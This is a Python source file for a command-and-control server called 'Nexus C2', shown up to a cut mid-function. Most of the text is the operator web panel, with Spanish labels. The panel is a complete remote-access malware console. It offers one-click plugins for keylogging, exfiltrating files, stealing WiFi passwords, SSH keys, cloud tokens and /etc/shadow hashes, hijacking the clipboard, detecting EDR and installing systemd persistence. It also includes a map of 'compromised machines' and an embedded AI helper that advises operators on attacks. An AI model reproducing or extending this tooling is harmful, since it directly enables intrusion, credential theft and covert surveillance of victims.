import asyncio
import base64
import json
import logging
import os
import re
import socket as _socket
import struct
import time
import uuid

import aiohttp
from aiohttp import web

from protocol import (
    MSG_HELLO, MSG_BEACON, MSG_TASK, MSG_RESULT,
    MSG_NOP, MSG_ERROR, MSG_NAMES,
    pack_clear, unpack_clear,
    server_process_hello, build_frame, parse_frame,
    generate_server_keypair, save_server_key, load_server_key, get_pub_bytes,
)
from cryptography.exceptions import InvalidTag

# ---------------------------------------------------------------------------
# Operator web panel (served at GET /)
# ---------------------------------------------------------------------------
_PANEL_HTML = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nexus C2</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='4' fill='%2308080f'/%3E%3Ctext x='3' y='22' font-size='14' fill='%2300ff41' font-family='monospace' font-weight='bold'%3E%3E_%3C/text%3E%3C/svg%3E">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{font-size:15px}
body{background:#08080f;color:#c8c8d8;font-family:'Cascadia Code','JetBrains Mono','Fira Code','Courier New',monospace;height:100vh;display:flex;flex-direction:column;font-size:1rem}

/* ── Header ─────────────────────────────────────────────────────────── */
header{background:#0d0d16;border-bottom:1px solid #252540;padding:0 20px;height:48px;display:flex;align-items:center;gap:14px;flex-shrink:0}
header h1{color:#00ff41;font-size:.9em;letter-spacing:4px;font-weight:700}
.badge{font-size:.7em;color:#8888b0;border:1px solid #2a2a45;padding:3px 10px;border-radius:3px;letter-spacing:1px;text-transform:uppercase}
.badge-live{font-size:.7em;color:#00ee44;border:1px solid #1a4a1a;padding:3px 10px;border-radius:3px;letter-spacing:1px;font-weight:600}

/* ── Layout ─────────────────────────────────────────────────────────── */
.container{display:grid;grid-template-columns:1fr 1fr;gap:2px;flex:1;min-height:0;background:#1a1a30}
.left-col{display:flex;flex-direction:column;gap:2px;min-height:0;background:#08080f}
.panel{background:#0c0c16;display:flex;flex-direction:column;overflow:hidden}
.agents-panel{flex:1;min-height:0}
.panel-title{background:#111120;border-bottom:1px solid #22223a;padding:8px 14px;font-size:.72em;color:#8888b8;text-transform:uppercase;letter-spacing:2px;flex-shrink:0;display:flex;align-items:center;gap:8px}

/* ── Agents table ────────────────────────────────────────────────────── */
.tbl-wrap{flex:1;overflow-y:auto}
.tbl-wrap::-webkit-scrollbar{width:3px}
.tbl-wrap::-webkit-scrollbar-thumb{background:#2a2a45}
table{width:100%;border-collapse:collapse;font-size:.82em}
th{background:#0e0e1c;color:#6666a0;padding:9px 14px;text-align:left;font-size:.72em;text-transform:uppercase;letter-spacing:1.5px;border-bottom:1px solid #22223a;font-weight:400}
td{padding:10px 14px;border-bottom:1px solid #111120;cursor:pointer;white-space:nowrap;color:#9898c0;transition:background .1s,color .1s}
tr:hover td{background:#111120;color:#c0c0e0}
tr.selected td{background:#071408;color:#c0c0e0}
tr.selected td:first-child{border-left:2px solid #00ff41}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:8px;vertical-align:middle;flex-shrink:0}
.dot.online{background:#00ff41;box-shadow:0 0 6px #00ff4199}
.dot.offline{background:#333355}
.jbar{display:inline-block;height:3px;border-radius:2px;vertical-align:middle;margin-right:5px;transition:width .4s,background .4s}

/* ── Terminal ────────────────────────────────────────────────────────── */
.terminal{background:#06060d;border-top:2px solid #1a1a30;flex-direction:column;height:380px;flex-shrink:0;display:none}
.terminal.open{display:flex}

/* Titlebar */
.term-titlebar{background:#0c0c1a;border-bottom:1px solid #22223a;padding:0 14px;height:42px;display:flex;align-items:center;gap:10px;flex-shrink:0;user-select:none}
.win-btns{display:flex;gap:6px;align-items:center;margin-right:4px}
.wbtn{width:12px;height:12px;border-radius:50%;cursor:pointer;flex-shrink:0;transition:filter .1s}
.wbtn:hover{filter:brightness(1.3)}
.wbtn.wclose{background:#ff5f57}.wbtn.wmin{background:#febc2e}.wbtn.wmax{background:#28c840}
.vsep{width:1px;height:20px;background:#22223a;flex-shrink:0}
.term-agent-id{color:#00ff41;font-size:.75em;letter-spacing:1px;flex:1;text-transform:uppercase;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* OS toggle — segmented control */
.os-toggle{display:flex;background:#0a0a14;border:1px solid #22223a;border-radius:4px;padding:2px;gap:2px}
.os-btn{height:24px;padding:0 12px;background:transparent;color:#ffffff;border:none;font-family:inherit;font-size:.7em;letter-spacing:1px;cursor:pointer;border-radius:3px;transition:all .15s;text-transform:uppercase;white-space:nowrap}
.os-btn:hover{color:#c0c0e8}
.os-btn.active{background:#1e1e38;color:#00ff41;font-weight:600}

/* Help button */
.help-btn{height:28px;padding:0 12px;background:#0e0e1e;color:#8888b8;border:1px solid #2a2a45;font-family:inherit;font-size:.7em;letter-spacing:1px;cursor:pointer;border-radius:3px;transition:all .15s;text-transform:uppercase}
.help-btn:hover{color:#ffcc44;border-color:#443300;background:#1a1400}

/* Terminal body */
.term-body{flex:1;overflow-y:auto;padding:10px 14px;font-size:.82em;line-height:1.75;min-height:0}
.term-body::-webkit-scrollbar{width:2px}
.term-body::-webkit-scrollbar-thumb{background:#2a2a45}
.tl{white-space:pre-wrap;word-break:break-all}
.tl.cmd{color:#00ff41;font-weight:600}
.tl.out{color:#b8b8d8}
.tl.err{color:#ff6060}
.tl.sys{color:#ffffff}

/* ── Plugin bar — 3 rows ─────────────────────────────────────────────── */
.plugin-bar{background:#08080e;border-top:1px solid #1e1e38;padding:6px 12px 7px;display:flex;flex-direction:column;gap:4px;flex-shrink:0}
.prow{display:flex;align-items:center;gap:5px;height:28px}
.prow-divider{width:1px;height:18px;background:#22223a;flex-shrink:0;margin:0 4px}

/* Category label */
.clabel{font-size:.64em;color:#ffffff;text-transform:uppercase;letter-spacing:1.5px;min-width:56px;width:56px;text-align:right;flex-shrink:0;padding-right:8px;border-right:1px solid #2a2a45;line-height:1;font-weight:600}

/* ALL plugin buttons — uniform height */
.pbtn{height:26px;padding:0 10px;font-family:inherit;font-size:.74em;cursor:pointer;border-radius:3px;display:inline-flex;align-items:center;justify-content:center;white-space:nowrap;letter-spacing:0.3px;transition:background .12s,border-color .12s,color .12s;border-width:1px;border-style:solid}
.pbtn.g{background:#0d1f0d;color:#00cc33;border-color:#1e4a1e}
.pbtn.g:hover{background:#162e16;border-color:#00ff41;color:#00ff41}
.pbtn.g:active{background:#00ff41;color:#000;border-color:#00ff41}
.pbtn.o{background:#1c1500;color:#ddaa00;border-color:#3a2a00}
.pbtn.o:hover{background:#261d00;border-color:#ffcc00;color:#ffcc00}
.pbtn.o:active{background:#ffcc00;color:#000;border-color:#ffcc00}
.pbtn.r{background:#1a0d0d;color:#ee4444;border-color:#3a1a1a}
.pbtn.r:hover{background:#261414;border-color:#ff6060;color:#ff6060}
.pbtn.r:active{background:#ff6060;color:#000;border-color:#ff6060}

/* ── Shell dropdown ──────────────────────────────────────────────────── */
.cmd-row{border-top:1px solid #1e1e38;background:#06060c;padding:5px 12px;display:flex;align-items:center;gap:8px;flex-shrink:0}
.cmd-row-label{font-size:.64em;color:#ffffff;text-transform:uppercase;letter-spacing:1.5px;white-space:nowrap;min-width:56px;text-align:right;padding-right:8px;border-right:1px solid #2a2a45;font-weight:600}
.cmd-select{flex:1;height:26px;background:#0d0d1a;color:#9090c0;border:1px solid #2a2a45;padding:0 8px;font-family:inherit;font-size:.74em;border-radius:3px;cursor:pointer;outline:none;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='8' height='4'%3E%3Cpath d='M0 0l4 4 4-4z' fill='%236666a0'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 8px center;padding-right:22px}
.cmd-select:focus{border-color:#4444aa;color:#b0b0e0}
.cmd-select option{background:#0d0d1a;color:#9090c0}

/* ── Input row ───────────────────────────────────────────────────────── */
.term-input-row{display:flex;align-items:center;padding:0 14px;height:40px;border-top:1px solid #1e3a1e;background:#05050d;flex-shrink:0}
.term-prompt{color:#00dd33;font-size:.82em;flex-shrink:0;margin-right:8px;white-space:nowrap}
#term-input{background:transparent;border:none;outline:none;color:#00ff41;font-family:inherit;font-size:.82em;flex:1;caret-color:#00ff41}
#term-input::placeholder{color:#2a2a50}

/* ── Results panel ───────────────────────────────────────────────────── */
.results-body{flex:1;overflow-y:auto;padding:10px}
.results-body::-webkit-scrollbar{width:3px}
.results-body::-webkit-scrollbar-thumb{background:#2a2a45}
.r-entry{background:#0d0d18;border:1px solid #1e1e38;border-radius:4px;margin-bottom:8px;padding:10px 14px;transition:border-color .12s}
.r-entry:hover{border-color:#33335a}
.r-meta{display:flex;gap:12px;align-items:center;margin-bottom:8px;font-size:.7em;color:#6666a0;letter-spacing:.5px}
.r-meta b{color:#9090c0;font-weight:600}
.ok{color:#00dd33}.errc{color:#ff5555}
.r-out{color:#aaaacc;white-space:pre-wrap;word-break:break-all;font-size:.8em;line-height:1.7}
.r-err{color:#ff6060;white-space:pre-wrap;word-break:break-all;font-size:.8em;line-height:1.7}
.empty{color:#44447a;text-align:center;padding:50px 20px;font-size:.8em;letter-spacing:2px;text-transform:uppercase}

/* ── Toast ───────────────────────────────────────────────────────────── */
.toast{position:fixed;bottom:28px;right:20px;background:#0d0d1a;border:1px solid #00ff41;color:#00ff41;padding:8px 18px;font-size:.75em;border-radius:4px;opacity:0;transition:opacity .25s;pointer-events:none;letter-spacing:.5px}
.toast.show{opacity:1}

/* ── Status bar ──────────────────────────────────────────────────────── */
.statusbar{background:#08080f;border-top:1px solid #14142a;padding:5px 18px;font-size:.68em;color:#5555a0;display:flex;justify-content:space-between;flex-shrink:0;letter-spacing:.5px}

/* ── Help modal ──────────────────────────────────────────────────────── */
.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:100;align-items:center;justify-content:center}
.modal-bg.open{display:flex}
.modal{background:#0d0d18;border:1px solid #2a2a4a;border-radius:6px;width:720px;max-width:95vw;max-height:84vh;display:flex;flex-direction:column;box-shadow:0 24px 64px rgba(0,0,0,.9)}
.modal-head{background:#111120;border-bottom:1px solid #22223a;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0;border-radius:6px 6px 0 0}
.modal-head h2{color:#00ff41;font-size:.82em;letter-spacing:3px;font-weight:400}
.modal-close{background:none;border:1px solid #2a2a4a;color:#6666a0;cursor:pointer;font-size:.8em;width:28px;height:28px;border-radius:3px;display:flex;align-items:center;justify-content:center;transition:all .15s;flex-shrink:0}
.modal-close:hover{border-color:#ff5555;color:#ff5555;background:#1a0808}
.modal-body{overflow-y:auto;padding:18px 20px}
.modal-body::-webkit-scrollbar{width:3px}
.modal-body::-webkit-scrollbar-thumb{background:#2a2a4a}
.msec{margin-bottom:20px}
.msec h3{color:#7070c0;font-size:.66em;text-transform:uppercase;letter-spacing:3px;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid #1a1a2e;font-weight:600}
.mrow{display:grid;grid-template-columns:165px 1fr;gap:8px 16px;padding:6px 0;border-bottom:1px solid #111120;align-items:start}
.mrow:last-child{border-bottom:none}
.mcmd{color:#00cc33;font-size:.78em;letter-spacing:.3px}
.mcmd.o{color:#ddaa00}
.mtag{font-size:.62em;color:#8888b8;background:#12121e;border:1px solid #2a2a4a;padding:2px 6px;border-radius:2px;margin-left:6px;vertical-align:middle}
.mdesc{color:#8888b8;font-size:.76em;line-height:1.65}

/* Keyboard row in modal */
.krow{display:grid;grid-template-columns:165px 1fr;gap:8px 16px;padding:6px 0;border-bottom:1px solid #111120;align-items:center}
.krow:last-child{border-bottom:none}
.kkey{font-size:.74em;color:#9090c8;background:#12121e;border:1px solid #2a2a4a;padding:3px 10px;border-radius:3px;display:inline-block}

/* ── Responsive ──────────────────────────────────────────────────────── */
@media(max-width:900px){
  .container{grid-template-columns:1fr}
  .terminal{height:320px}
}
@media(max-width:600px){
  header h1{letter-spacing:2px}
  .prow{flex-wrap:wrap;height:auto;padding:2px 0}
  .clabel{min-width:44px;width:44px}
  .terminal{height:280px}
}
/* ── Tabs ─────────────────────────────────────────────────────────────── */
.tab-btn{background:transparent;border:none;border-bottom:3px solid transparent;color:#8888b8;font-family:inherit;font-size:.75em;letter-spacing:1px;text-transform:uppercase;padding:0 20px;height:38px;cursor:pointer;transition:all .15s;white-space:nowrap}
.tab-btn:hover{color:#00cc33;background:#0a110a}
.tab-btn.active{color:#00ff41;border-bottom-color:#00ff41;background:#060e06;font-weight:700}
/* ── NexusAI floating bubble ─────────────────────────────────────────── */
#ai-bubble{position:fixed;bottom:52px;right:72px;width:42px;height:42px;border-radius:50%;background:#0d1a0d;border:2px solid #00ff41;color:#00ff41;font-size:20px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;box-shadow:0 0 18px #00ff4155;transition:transform .15s,box-shadow .15s;user-select:none}
#ai-bubble:hover{transform:scale(1.1);box-shadow:0 0 28px #00ff4188}
#ai-widget{position:fixed;bottom:104px;right:72px;width:340px;height:460px;background:#08080f;border:1px solid #00ff4155;border-radius:10px;display:none;flex-direction:column;z-index:999;box-shadow:0 8px 40px rgba(0,255,65,.18);overflow:hidden}
#ai-widget.open{display:flex}
#ai-header{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid #11113a;background:#0a0f0a;flex-shrink:0}
#ai-header span{color:#00ff41;font-size:.78em;letter-spacing:2px;text-transform:uppercase;flex:1}
#ai-close{background:none;border:none;color:#444466;font-size:16px;cursor:pointer;padding:0 4px;line-height:1}
#ai-close:hover{color:#00ff41}
#ai-msgs{flex:1;overflow-y:auto;padding:10px 12px;display:flex;flex-direction:column;gap:7px}
#ai-msgs::-webkit-scrollbar{width:3px}
#ai-msgs::-webkit-scrollbar-thumb{background:#00ff4133;border-radius:2px}
.ai-msg{padding:7px 11px;border-radius:8px;font-size:.8em;line-height:1.55;word-break:break-word;max-width:88%}
.ai-msg.user{background:#0d1a0d;border:1px solid #00ff4133;color:#c0e0c0;align-self:flex-end;border-bottom-right-radius:2px}
.ai-msg.bot{background:#0a0a18;border:1px solid #1e1e3a;color:#c0c0e8;align-self:flex-start;border-bottom-left-radius:2px}
.ai-msg.bot code{background:#12121e;color:#00ff41;padding:1px 4px;border-radius:3px}
.ai-msg.bot pre{background:#0d0d1a;border:1px solid #1e1e3a;border-radius:4px;padding:7px;overflow-x:auto;margin:5px 0;white-space:pre-wrap}
.ai-msg.bot pre code{background:none;padding:0}
.ai-thinking{color:#3a3a6a;font-style:italic;font-size:.76em;align-self:flex-start;padding:3px 10px;animation:blink 1.2s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:.4}50%{opacity:1}}
#ai-input-row{display:flex;gap:5px;padding:7px 8px;border-top:1px solid #11113a;background:#08080f;flex-shrink:0}
#ai-input{flex:1;background:#0d0d18;border:1px solid #22224a;border-radius:6px;color:#c0c0e8;font-family:inherit;font-size:.8em;padding:6px 9px;resize:none;height:34px;outline:none;transition:border-color .15s;line-height:1.4}
#ai-input:focus{border-color:#00ff4155}
#ai-send{background:#00330d;border:1px solid #00ff4155;color:#00ff41;border-radius:6px;padding:0 12px;height:34px;cursor:pointer;font-family:inherit;font-size:.75em;letter-spacing:1px;white-space:nowrap;transition:all .15s}
#ai-send:hover{background:#004d14;border-color:#00ff41}
#ai-send:disabled{opacity:.35;cursor:default}
/* ── Victim map ───────────────────────────────────────────────────────── */
#victim-map{background:#06060d}
.leaflet-container{background:#06060d!important;font-family:inherit}
.leaflet-bar{border:1px solid #00ff4155!important;box-shadow:0 2px 12px rgba(0,255,65,.15)!important;border-radius:4px!important;overflow:hidden}
.leaflet-bar a,.leaflet-bar a:hover{background:#0d1a0d!important;color:#00ff41!important;border-bottom:1px solid #00ff4133!important;width:28px!important;height:28px!important;line-height:28px!important;font-size:16px!important;font-weight:700!important;text-align:center!important;display:block!important;text-decoration:none!important}
.leaflet-bar a:last-child{border-bottom:none!important}
.leaflet-bar a:hover{background:#162e16!important;color:#00ff41!important}
.leaflet-bar a.leaflet-disabled{color:#00ff4133!important;cursor:default!important}
.victim-pin{width:18px;height:18px;border-radius:50%;background:#00ff41;border:3px solid #003a10;box-shadow:0 0 14px #00ff4199;animation:ping 2s ease-out infinite;cursor:pointer}
.victim-pin::after{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid #00ff4155;animation:ring 2s ease-out infinite}
@keyframes ping{0%{box-shadow:0 0 0 0 #00ff4188}70%{box-shadow:0 0 0 16px transparent}100%{box-shadow:0 0 0 0 transparent}}
@keyframes ring{0%{transform:scale(1);opacity:.8}100%{transform:scale(2.2);opacity:0}}
.victim-popup{background:#0d0d18!important;border:1px solid #00ff41!important;border-radius:4px;color:#c0c0e0;font-size:.78em;font-family:monospace}
.victim-popup .leaflet-popup-content-wrapper{background:#0d0d18;border:1px solid #00ff41;border-radius:4px;box-shadow:0 0 20px #00ff4133}
.victim-popup .leaflet-popup-tip{background:#00ff41}
.victim-popup .leaflet-popup-content{color:#c0c0e0;font-size:.82em;line-height:1.6}
</style>
</head>
<body>
<header>
  <h1>&#9632; NEXUS C2</h1>
  <span class="badge">Panel Operador</span>
  <span class="badge-live" id="hdr-count">0/0 online</span>
</header>

<!-- Help modal -->
<div class="modal-bg" id="help-modal">
  <div class="modal">
    <div class="modal-head">
      <h2>&#9432;&nbsp;&nbsp;Referencia de Plugins</h2>
      <button class="modal-close" onclick="closeHelp()">&#x2715;</button>
    </div>
    <div class="modal-body">
      <div class="msec">
        <h3>Reconocimiento</h3>
        <div class="mrow"><span class="mcmd">!sysinfo</span><span class="mdesc">Info completa del sistema: OS, CPU, RAM, red, disco. Compatible Windows y Linux.</span></div>
        <div class="mrow"><span class="mcmd">!screenshot</span><span class="mdesc">Captura la pantalla. Linux: grim / scrot / mss. Windows: Pillow o mss.</span></div>
        <div class="mrow"><span class="mcmd">!nmcli<span class="mtag">Linux</span></span><span class="mdesc">Resumen de red: dispositivos y conexiones activas.</span></div>
        <div class="mrow"><span class="mcmd">!nmcli wifi</span><span class="mdesc">Lista redes WiFi visibles desde la máquina vulnerada.</span></div>
        <div class="mrow"><span class="mcmd o">!nmcli passwords</span><span class="mdesc">Extrae contraseñas WiFi guardadas en NetworkManager.</span></div>
        <div class="mrow"><span class="mcmd">!nmcli ifaces</span><span class="mdesc">Interfaces de red con IPs asignadas.</span></div>
      </div>
      <div class="msec">
        <h3>Archivos</h3>
        <div class="mrow"><span class="mcmd o">!cat &lt;ruta&gt;</span><span class="mdesc">Lee un archivo de texto. Si es directorio, lista su contenido.</span></div>
        <div class="mrow"><span class="mcmd o">!cat &lt;ruta&gt; --hex</span><span class="mdesc">Vista hexadecimal de las primeras 1024 bytes. Útil para binarios.</span></div>
        <div class="mrow"><span class="mcmd o">!exfil &lt;ruta&gt;</span><span class="mdesc">Sube un archivo al servidor C2 &#8594; exfil_files/. Máx 50 MB.</span></div>
        <div class="mrow"><span class="mcmd o">!download &lt;url&gt; &lt;dest&gt;</span><span class="mdesc">Descarga desde internet hacia la máquina vulnerada.</span></div>
      </div>
      <div class="msec">
        <h3>Credenciales</h3>
        <div class="mrow"><span class="mcmd o">!mimikatz<span class="mtag">Linux</span></span><span class="mdesc">Harvesta historial shell, SSH keys, tokens AWS/GCP/Azure y hashes de /etc/shadow.</span></div>
        <div class="mrow"><span class="mcmd">!clip read</span><span class="mdesc">Lee el portapapeles de la máquina vulnerada (xclip / xsel / wl-paste).</span></div>
        <div class="mrow"><span class="mcmd o">!clip write &lt;texto&gt;</span><span class="mdesc">Escribe texto en el portapapeles de la máquina vulnerada.</span></div>
      </div>
      <div class="msec">
        <h3>Keylogger</h3>
        <div class="mrow"><span class="mcmd">!keylog start</span><span class="mdesc">Inicia captura de keystrokes en segundo plano usando pynput.</span></div>
        <div class="mrow"><span class="mcmd">!keylog dump</span><span class="mdesc">Muestra lo capturado hasta ahora sin detener el keylogger.</span></div>
        <div class="mrow"><span class="mcmd">!keylog stop</span><span class="mdesc">Detiene el keylogger y devuelve el buffer completo.</span></div>
      </div>
      <div class="msec">
        <h3>Evasión y Persistencia</h3>
        <div class="mrow"><span class="mcmd">!unhook</span><span class="mdesc">Detecta LD_PRELOAD, tracers, hooks en memoria y procesos AV/EDR activos.</span></div>
        <div class="mrow"><span class="mcmd o">!persist<span class="mtag">Linux</span></span><span class="mdesc">Instala el agente como servicio systemd para persistencia en reinicios.</span></div>
        <div class="mrow"><span class="mcmd o">!notify &lt;mensaje&gt;</span><span class="mdesc">Muestra un mensaje en pantalla de la víctima en tiempo real. Linux: notify-send → zenity → xmessage → wall. Windows: MessageBox nativo.</span></div>
      </div>
      <div class="msec">
        <h3>Atajos de teclado</h3>
        <div class="krow"><span class="kkey">&#8593; / &#8595;</span><span class="mdesc">Navega el historial de comandos.</span></div>
        <div class="krow"><span class="kkey">Ctrl + L</span><span class="mdesc">Limpia la terminal.</span></div>
        <div class="krow"><span class="kkey">!help</span><span class="mdesc">Lista plugins disponibles directamente en la terminal del agente.</span></div>
      </div>
    </div>
  </div>
</div>

<div class="container">
  <div class="left-col">
    <!-- Agents table -->
    <div class="panel agents-panel">
      <div class="panel-title">Agentes conectados</div>
      <div class="tbl-wrap">
        <table>
          <thead><tr><th>Estado</th><th>Usuario</th><th>Host</th><th>OS</th><th>Beacon</th></tr></thead>
          <tbody id="agent-rows"><tr><td colspan="5" class="empty">Sin agentes</td></tr></tbody>
        </table>
      </div>
    </div>
    <!-- Terminal -->
    <div class="terminal" id="terminal">
      <div class="term-titlebar">
        <span class="win-btns">
          <span class="wbtn wclose" title="Cerrar" onclick="document.getElementById('terminal').classList.remove('open')"></span>
          <span class="wbtn wmin"></span>
          <span class="wbtn wmax"></span>
        </span>
        <span class="vsep"></span>
        <span class="term-agent-id" id="term-title">—</span>
        <div class="os-toggle">
          <button class="os-btn active" id="os-linux" onclick="setOS('linux')">Linux</button>
          <button class="os-btn" id="os-win" onclick="setOS('windows')">Windows</button>
        </div>
        <button class="help-btn" onclick="openHelp()">? Ayuda</button>
      </div>
      <div class="term-body" id="term-body"></div>
      <div class="plugin-bar" id="plugin-bar"></div>
      <div class="cmd-row">
        <span class="cmd-row-label">Shell</span>
        <select class="cmd-select" id="cmd-select" onchange="pickShell(this)"></select>
      </div>
      <div class="term-input-row">
        <span class="term-prompt" id="term-prompt">~$&nbsp;</span>
        <input id="term-input" type="text" autocomplete="off" spellcheck="false" placeholder="comando o !plugin..."/>
      </div>
    </div>
  </div>
  <!-- Right panel: tabs Resultados / Mapa -->
  <div class="panel" style="display:flex;flex-direction:column;min-height:0">
    <div class="panel-title" style="gap:0;padding:0">
      <button class="tab-btn active" id="tab-res" onclick="switchTab('res')">Resultados</button>
      <button class="tab-btn" id="tab-map" onclick="switchTab('map')">&#127758; Equipos Vulnerados</button>
      <span style="flex:1"></span>
      <span id="res-agent" style="color:#00cc33;font-size:.72em;padding:0 14px">selecciona un agente</span>
      <span id="res-count" style="color:#6666a0;font-size:.72em;padding-right:14px"></span>
    </div>
    <div id="pane-res" class="results-body" style="flex:1;min-height:0"><div class="empty">Selecciona un agente</div></div>
    <div id="pane-map" style="flex:1;min-height:0;display:none;position:relative">
      <div id="victim-map" style="width:100%;height:100%"></div>
    </div>
  </div>
</div>
<div class="toast" id="toast"></div>
<div class="statusbar"><span id="st-left">Conectando...</span><span id="st-right"></span></div>

<!-- NexusAI floating widget -->
<div id="ai-bubble" title="NexusAI" onclick="aiToggle()">&#129302;</div>
<div id="ai-widget">
  <div id="ai-header">
    <span>&#129302; NEXUSAI</span>
    <button id="ai-close" onclick="aiToggle()" title="Cerrar">&#10005;</button>
  </div>
  <div id="ai-msgs">
    <div class="ai-msg bot">Hola, soy <b>NexusAI</b>. Pregúntame qué comandos usar o cómo lograr un objetivo en el agente seleccionado.</div>
  </div>
  <div id="ai-input-row">
    <textarea id="ai-input" placeholder="Pregunta algo... (Enter para enviar)" rows="1"></textarea>
    <button id="ai-send" onclick="aiSend()">&#9654;</button>
  </div>
</div>

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
let sel=null,agents=[],cmdHist=[],histIdx=-1,waitTask=null,currentOS='linux';
const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const ts2s=ts=>ts?new Date(ts*1000).toLocaleTimeString():'?';

// ── Plugin data (3-row layout per OS) ─────────────────────────────────────
const ROWS={
  linux:[
    // Row 1 — one group
    [{cat:'RECON',items:[
      {cmd:'!sysinfo',label:'!sysinfo',cls:'g'},
      {cmd:'!screenshot',label:'!screenshot',cls:'g'},
      {cmd:'!nmcli wifi',label:'!nmcli wifi',cls:'g'},
      {cmd:'!nmcli passwords',label:'!nmcli pwd',cls:'o'},
    ]}],
    // Row 2 — two groups
    [
      {cat:'FILES',items:[
        {cmd:'!cat ',label:'!cat ···',cls:'o',arg:true},
        {cmd:'!exfil ',label:'!exfil ···',cls:'o',arg:true},
        {cmd:'!download ',label:'!download ···',cls:'o',arg:true},
      ]},
      {cat:'CREDS',items:[
        {cmd:'!mimikatz',label:'!mimikatz',cls:'r'},
        {cmd:'!clip read',label:'!clip read',cls:'g'},
        {cmd:'!clip write ',label:'!clip write ···',cls:'o',arg:true},
      ]},
    ],
    // Row 3 — two groups
    [
      {cat:'KEYLOG',items:[
        {cmd:'!keylog start',label:'▶ start',cls:'g'},
        {cmd:'!keylog dump',label:'↓ dump',cls:'g'},
        {cmd:'!keylog stop',label:'■ stop',cls:'r'},
      ]},
      {cat:'EVASIÓN',items:[
        {cmd:'!unhook',label:'!unhook',cls:'g'},
        {cmd:'!persist',label:'!persist',cls:'r'},
        {cmd:'!notify ',label:'!notify ···',cls:'r',arg:true},
      ]},
    ],
  ],
  windows:[
    [{cat:'RECON',items:[
      {cmd:'!sysinfo',label:'!sysinfo',cls:'g'},
      {cmd:'!screenshot',label:'!screenshot',cls:'g'},
    ]}],
    [
      {cat:'FILES',items:[
        {cmd:'!cat ',label:'!cat ···',cls:'o',arg:true},
        {cmd:'!exfil ',label:'!exfil ···',cls:'o',arg:true},
        {cmd:'!download ',label:'!download ···',cls:'o',arg:true},
      ]},
      {cat:'CREDS',items:[
        {cmd:'!clip read',label:'!clip read',cls:'g'},
        {cmd:'!clip write ',label:'!clip write ···',cls:'o',arg:true},
      ]},
    ],
    [
      {cat:'KEYLOG',items:[
        {cmd:'!keylog start',label:'▶ start',cls:'g'},
        {cmd:'!keylog dump',label:'↓ dump',cls:'g'},
        {cmd:'!keylog stop',label:'■ stop',cls:'r'},
      ]},
      {cat:'EVASIÓN',items:[
        {cmd:'!unhook',label:'!unhook',cls:'g'},
        {cmd:'!notify ',label:'!notify ···',cls:'r',arg:true},
      ]},
    ],
  ],
};

const SHELL={
  linux:['── shell rápido ──','whoami','id','uname -a','hostname','ps aux','ls -la','ls -la /tmp','cat /etc/passwd','cat /etc/shadow','ip a','ss -tlnp','netstat -tlnp','crontab -l','env','df -h','free -h','history'],
  windows:['── shell rápido ──','whoami','whoami /all','hostname','systeminfo','ipconfig /all','netstat -ano','tasklist','dir','dir C:\\Users','dir %TEMP%','type C:\\Windows\\System32\\drivers\\etc\\hosts','net user','arp -a','schtasks /query /fo LIST','wmic os get Caption,Version,OSArchitecture','wmic logicaldisk get Caption,Size,FreeSpace','wmic OS get FreePhysicalMemory,TotalVisibleMemorySize','reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','set','echo %USERNAME% %COMPUTERNAME% %OS%'],
};

function renderPluginBar(){
  const bar=document.getElementById('plugin-bar');
  bar.innerHTML='';
  ROWS[currentOS].forEach(rowGroups=>{
    const row=document.createElement('div');
    row.className='prow';
    rowGroups.forEach((grp,gi)=>{
      if(gi>0){const d=document.createElement('div');d.className='prow-divider';row.appendChild(d);}
      const lbl=document.createElement('span');
      lbl.className='clabel';lbl.textContent=grp.cat;
      row.appendChild(lbl);
      grp.items.forEach(p=>{
        const btn=document.createElement('button');
        btn.className='pbtn '+p.cls;
        btn.textContent=p.label;
        btn.title=p.cmd+(p.arg?'<ruta/arg>':'')+' — clic para '+(p.arg?'rellenar':'ejecutar');
        btn.onclick=()=>p.arg?fillInput(p.cmd):runPlugin(p.cmd);
        row.appendChild(btn);
      });
    });
    bar.appendChild(row);
  });
}

function renderShellDrop(){
  const s=document.getElementById('cmd-select');
  s.innerHTML=SHELL[currentOS].map((c,i)=>'<option value="'+( i===0?'':c)+'">'+c+'</option>').join('');
}

function setOS(os){
  currentOS=os;
  document.getElementById('os-linux').classList.toggle('active',os==='linux');
  document.getElementById('os-win').classList.toggle('active',os==='windows');
  renderPluginBar();renderShellDrop();
}

function openHelp(){document.getElementById('help-modal').classList.add('open');}
function closeHelp(){document.getElementById('help-modal').classList.remove('open');}
document.getElementById('help-modal').addEventListener('click',e=>{if(e.target===e.currentTarget)closeHelp();});

// ── Jitter bar ─────────────────────────────────────────────────────────────
function jBar(ts,st){
  if(st!=='online')return'<span style="color:#555588">offline</span>';
  const s=Math.floor(Date.now()/1000-ts);
  const w=Math.min(80,(s/10)*80);
  const c=s<8?'#00ff41':s<15?'#ffaa00':'#ff4444';
  return'<span class="jbar" style="width:'+w+'px;background:'+c+'"></span><span style="color:'+c+'">'+s+'s</span>';
}

// ── Toast ──────────────────────────────────────────────────────────────────
function toast(msg){
  const t=document.getElementById('toast');
  t.textContent=msg;t.className='toast';
  requestAnimationFrame(()=>t.classList.add('show'));
  setTimeout(()=>t.classList.remove('show'),2500);
}

// ── Terminal print ─────────────────────────────────────────────────────────
function tprint(text,cls='out'){
